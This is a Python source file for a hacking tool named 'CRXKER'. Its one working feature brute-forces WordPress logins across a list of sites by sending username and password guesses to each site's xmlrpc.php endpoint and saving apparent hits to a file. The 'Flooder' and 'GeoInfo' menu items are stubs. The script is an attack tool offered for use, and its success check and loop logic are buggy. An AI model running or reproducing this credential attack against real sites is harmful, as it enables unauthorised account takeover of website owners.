import requests, re, os, colorama, time
from colorama import *

global success, info, fail
success, info, fail = Fore.GREEN + Style.BRIGHT, Fore.YELLOW + \
    Style.BRIGHT, Fore.RED + Style.BRIGHT

class color():
    def white():
        white = '\033[0m'
        return white
    def gold():
        gold = '\033[0;33m'
        return gold
    def yellow():
        yellow = '\033[1;33m'
        return yellow
    def red():
        red = '\033[1;91m'
        return red
    def green():
        green = '\033[1;32m'
        return green
    def purple():
        purple = '\033[1;35m'
        return purple
def clear():
    if os.name == 'nt':
        os.system('cls')
    elif os.name == 'posix':
        os.system('clear')
def logo():
    clear()
    logoz = """"""+color.purple()+"""
                        .-~~.    .--.    .~~-.
                    .-~.-~.- `. { """+color.white()+"""O ]]&gt;."""+color.purple()+"""' -.~-.~-.
                .-~.-~.-~.-~.  \ | |  /  .~-.~-.~-.~-.
            .-~.-~.-~.-~.-~.-~. V   \/ .~-.~-.~-.~-.~-.~-.
                      ~  ~.-~.- {    } -.~-.~  ~
                           ~ -~.~\  /~.~- ~
                                 //\\\\
                             """+color.gold()+""":"""+color.purple()+"""--"""+color.purple()+"""""--""--"""+color.gold()+""":
                             \\"""+color.purple()+"""~~~~~~~~~~"""+color.gold()+"""/
                              \ """+color.white()+"""CRXKER"""+color.gold()+""" /
                               \      /
                                \____/
                          """+color.purple()+"""Welcome To CRXKER !
                      Type 'help' to see command
    """
    print(logoz)
xml_path = '/xmlrpc.php'
xml_payload = """
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value>{}</value></param>
        <param><value>{}</value></param>
    </params>
</methodCall>
"""
class __commands__():
    def help():
        clear()
        logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Tools "+'\033[1;35m'+"        | "+'\033[0m'+"Show Tools    "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"GeoInfo "+'\033[1;35m'+"      | "+'\033[0m'+"Show GeoInfo  "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Flooder "+'\033[1;35m'+"      | "+'\033[0m'+"Show Flooder  "+'\033[1;35m'+" ║ \n"
        logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
        print(logo)
    def Tools():
        clear()
        logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"wpbrute "+'\033[1;35m'+"      | "+'\033[0m'+"BruteWP       "+'\033[1;35m'+" ║ \n"
        logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
        print(logo)
    def GeoInfo():
        print("Coming Soon!")
    def Flooder():
        print("Coming Soon!")
class __function__():
    def wp_bruteforce():
        def start_brute(url_file, file_name):
            with open(url_file, 'r') as f:
                urls = f.readline()
            site = urls
            list = site.split()
            for url in list:
                def url_test(url):
                    if 'https://' in url:
                        pass
                    elif 'http://' in url:
                        pass
                    else:
                        try:
                            url = 'https://'+url
                        except Exception:
                            url = 'http://'+url
                    if '/wp-login.php' in url:
                        url = url.replace('/wp-login.php', xml_path)
                    else:
                        url = url + xml_path
                        pass
                    print(f'{color.green()}Url Are Parsed: {color.white()}', url)
                    return url
                url = url_test(url)
                def bypass():
                    with open(file_name, 'rb') as files:
                        files_content = files.readlines()
                    nick_lines = files_content
                    password_lines = files_content
                    while True:
                        for nick in nick_lines:
                            for password in password_lines:
                                try:
                                        # Membuat payload untuk data login
                                    xml_payload = """
                                    <methodCall>
                                        <methodName>wp.getUsersBlogs</methodName>
                                        <params>
                                            <param><value>{}</value></param>
                                            <param><value>{}</value></param>
                                        </params>
                                    </methodCall>
                                    """.format(nick, password)

                                    # Melakukan permintaan POST untuk login
                                    process = f"---------------------------\nTrying Nick: {nick}\nPassword: {password}\nUrl: {url}\n---------------------------\n\n"
                                    print(process, end='\r')
                                    response = requests.post(url, data=xml_payload, timeout=10)
                                    keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' or 'blogName'
                                    if re.search(keyword, response.text, re.IGNORECASE):
                                            payload = '{}#{}@{}'.format(url, nick, password)
                                            print(success + f'Login Success !')
                                            print(response)
                                            def log(url):
                                                file = open((url) + ".txt", "a")
                                                file.write(str(payload))
                                                file.write("\n")
                                                file.close
                                            log(url)
                                    else:
                                        print(fail + f'Login Failed.')
                                        print(response)
                                except requests.exceptions.ReadTimeout:
                                    print("Request Timed Out, Please Wait..")
                                    time.sleep(60)
                                    continue
                            print(success + f"[ + ] Done.. [ + ]")
                bypass()
        if __name__ == '__main__':
            url_file = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL FILE LIST             "+'\033[1;35m'+': '+'\033[0m')
            file_name = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"USN & PASS FILE LIST     "+'\033[1;35m'+': '+'\033[0m')
            start_brute(url_file, file_name)
class main():
    def main():
        logo()
        PS1 = ""+'\033[1;35m'+"╭────["+'\033[0m'+"CRXKER"+'\033[0;31;40m'+"@"+'\033[0m'+"R00TZ"+'\033[1;35m'+"]\n"+'\033[1;35m'+"╰───>"+'\033[0m'+" "
        while PS1:
            prompt = input(PS1+'')
            if prompt.lower() == 'wpbrute':
                __function__.wp_bruteforce()
            elif prompt.lower() == 'geoinfo':
                __commands__.GeoInfo()
            elif prompt.lower() == 'flooder':
                __commands__.Flooder()
            elif prompt.lower() == 'tools':
                __commands__.Tools()
            elif prompt.lower() == 'help':
                __commands__.help()
            elif prompt.lower() == 'main':
                logo()
if __name__ == '__main__':
    main.main()